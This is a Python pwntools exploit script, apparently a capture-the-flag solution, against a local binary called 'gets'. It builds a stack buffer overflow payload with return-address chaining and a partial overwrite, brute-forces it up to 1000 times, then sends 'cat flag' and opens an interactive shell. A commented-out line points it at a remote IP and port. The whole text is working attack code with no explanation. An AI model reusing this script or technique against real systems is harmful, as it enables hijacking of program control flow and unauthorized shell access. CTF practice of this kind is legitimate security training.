#!/usr/bin/env python
# coding: utf-8

from pwn import *
import roputils
from hashlib import sha256

#context.terminal = ['mate-terminal', '--maximize', '-x', 'sh', '-c']
context.terminal = ['tmux', 'splitw', '-h']
#context.terminal = ['tmux', 'splitw', '-v']
context.log_level = 'debug'

if len(sys.argv) == 1:
    DEBUG = 1
    print "%d"%(DEBUG)
else:
	DEBUG = 0
	i=542
	for i in range(3):
		print i
	pause()

if DEBUG:
	DEBUG=1
    # p = process('./gets')
	# # libc = ELF("./libc-2.23.so")

    # gdb.attach(p,"""
	# b *0x400429
	# b *0x400434
	# c
	# """)

ret = 0x400434
for i in range(1000):
	print "i=%s"%i
	p = process("./gets")
	if i==21:
		gdb.attach(p,"""
		b *0x400429
		b *0x400434
		c
		""")
	#p = remote("106.75.4.189",35273)
	payload = "a" * 0x18
	for i in range(3):
		payload += p64(0x400430)
		payload += "a" * 0x18
	payload += p64(ret) * 2
	payload += p64(0x400429)


	p.sendline(payload)
	payload = "a" * 0x18
	payload += "\x16\x22"
	#payload += "\x70\xe7"
	p.sendline(payload)
	try:
		p.sendline("cat flag")
		flag= p.recv(timeout = 3)
		if "{" in flag:
			p.interactive()
		else:
			print "sth wrong"
			if "timeout:" not in flag:
				print flag
				p.interactive()
			
			# p.interactive()
			p.close()
	except:
		p.close()


